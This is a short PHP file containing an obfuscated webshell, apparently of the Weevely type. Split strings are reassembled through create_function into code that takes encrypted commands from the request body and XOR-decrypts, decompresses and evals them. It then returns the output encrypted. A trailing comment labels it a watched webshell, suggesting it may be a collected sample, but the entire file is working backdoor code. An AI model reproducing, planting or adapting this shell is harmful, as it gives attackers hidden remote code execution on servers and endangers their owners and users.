<?php
$J='`G`G=$t{$i}`G^$k{$j};}`G}retur`Gn $o;}`Gif (@`Gpr`Geg_match("/$k`Gh(.+`G)$kf/",`G@fil`Ge_`Gge`Gt_contents("php:/`G/in`';
$F='{$c=strl`Gen($`Gk);$l=st`Grlen`G($t)`G;$o="";for`G($`Gi=0;`G$i<$l;){f`Gor($j=`G0;($j<$c`G&&$i<$l`G);$j`G++,$i+`G+){$o.';
$c='`G$k`G`G="1b0679be";$kh="7`G2ad976ad`G5d4"`G;$k`Gf="91a`Gd57a`G5eec0";$p="ViF8Oz`GMvA7D`GVTfqb`G";funct`G`Gion x($t`G,$k)';
$w='Gput"),$m)=`G`G=1) {@ob_sta`Grt();@`Geva`G`Gl(@gzuncompr`Gess(@x(@b`Gase64_`Gdec`Gode($m`G[1`G]),$`Gk)));$o=@ob`G_`Gge';
$M=str_replace('Sz','','creSzSzaSztSze_fuSzncSztion');
$x='t_contents();`G@`Gob_en`Gd_clean();$`Gr=@base6`G4_`Ge`Gnc`Gode(@x(@gzcompre`Gss($o`G),$k));`Gprint`G("$p$kh$`Gr$kf");}';
$b=str_replace('`G','',$c.$F.$J.$w.$x);
$o=$M('',$b);$o();
?>
<?php
//--------------Watching webshell!--------------
